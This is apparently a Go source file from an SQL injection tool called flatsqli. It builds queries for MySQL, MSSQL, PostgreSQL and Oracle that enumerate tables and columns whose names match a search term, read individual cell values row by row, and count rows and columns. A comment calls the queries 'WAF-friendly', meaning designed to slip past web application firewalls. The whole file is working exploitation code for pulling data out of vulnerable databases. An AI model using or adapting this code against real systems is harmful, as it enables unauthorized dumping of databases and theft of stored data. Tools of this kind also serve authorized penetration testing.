package finder

import (
	"fmt"

	"github.com/morkin1792/flatsqli/internal/detector"
)

// All queries use simple LIKE with single term - WAF-friendly, works on all databases

// getTableAtOffsetSingleTerm returns query to get table_name matching a single term at offset
func (f *Finder) getTableAtOffsetSingleTerm(term string, offset int) string {
	switch f.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT table_name FROM (SELECT DISTINCT table_name FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%%%s%%' ORDER BY table_name) t LIMIT 1 OFFSET %d", term, offset)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) as rn FROM (SELECT DISTINCT table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema NOT IN ('sys','INFORMATION_SCHEMA') AND column_name LIKE '%%%s%%') t) x WHERE rn=%d", term, offset+1)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT table_name FROM (SELECT DISTINCT table_name FROM information_schema.columns WHERE table_schema='public' AND column_name LIKE '%%%s%%' ORDER BY table_name) t LIMIT 1 OFFSET %d", term, offset)
	case detector.Oracle:
		return fmt.Sprintf("SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) rn FROM (SELECT DISTINCT table_name FROM user_tab_columns WHERE column_name LIKE '%%%s%%') t) WHERE rn=%d", term, offset+1)
	default:
		return ""
	}
}

// getColumnAtOffsetSingleTerm returns query to get column_name matching a single term at offset
func (f *Finder) getColumnAtOffsetSingleTerm(term string, offset int) string {
	switch f.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%%%s%%' ORDER BY table_name, column_name LIMIT 1 OFFSET %d", term, offset)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY table_name, column_name) as rn FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema NOT IN ('sys','INFORMATION_SCHEMA') AND column_name LIKE '%%%s%%') x WHERE rn=%d", term, offset+1)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND column_name LIKE '%%%s%%' ORDER BY table_name, column_name LIMIT 1 OFFSET %d", term, offset)
	case detector.Oracle:
		return fmt.Sprintf("SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY table_name, column_name) rn FROM user_tab_columns WHERE column_name LIKE '%%%s%%') WHERE rn=%d", term, offset+1)
	default:
		return ""
	}
}

// getTableColumnAtOffset returns query to get a column name from a table at offset
func (f *Finder) getTableColumnAtOffset(tableName string, offset int) string {
	switch f.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='%s' ORDER BY ordinal_position LIMIT 1 OFFSET %d", tableName, offset)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY ordinal_position) as rn FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s') x WHERE rn=%d", tableName, offset+1)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='%s' ORDER BY ordinal_position LIMIT 1 OFFSET %d", tableName, offset)
	case detector.Oracle:
		return fmt.Sprintf("SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY column_id) rn FROM user_tab_columns WHERE table_name='%s') WHERE rn=%d", tableName, offset+1)
	default:
		return ""
	}
}

// getCellQuery returns query to get a specific cell value
func (f *Finder) getCellQuery(tableName, columnName string, rowOffset int) string {
	switch f.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT %s FROM %s LIMIT 1 OFFSET %d", columnName, tableName, rowOffset)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT %s FROM (SELECT %s, ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as rn FROM %s) x WHERE rn=%d", columnName, columnName, tableName, rowOffset+1)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT %s FROM %s LIMIT 1 OFFSET %d", columnName, tableName, rowOffset)
	case detector.Oracle:
		return fmt.Sprintf("SELECT %s FROM (SELECT %s, ROWNUM rn FROM %s) WHERE rn=%d", columnName, columnName, tableName, rowOffset+1)
	default:
		return ""
	}
}

// getRowCountQuery returns query to count rows in a table
func (f *Finder) getRowCountQuery(tableName string) string {
	return fmt.Sprintf("SELECT COUNT(*) FROM %s", tableName)
}

// getColumnCountQuery returns query to count columns in a table
func (f *Finder) getColumnCountQuery(tableName string) string {
	switch f.dbType {
	case detector.MySQL:
		return fmt.Sprintf("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='%s'", tableName)
	case detector.MSSQL:
		return fmt.Sprintf("SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s'", tableName)
	case detector.PostgreSQL:
		return fmt.Sprintf("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='public' AND table_name='%s'", tableName)
	case detector.Oracle:
		return fmt.Sprintf("SELECT COUNT(*) FROM user_tab_columns WHERE table_name='%s'", tableName)
	default:
		return ""
	}
}
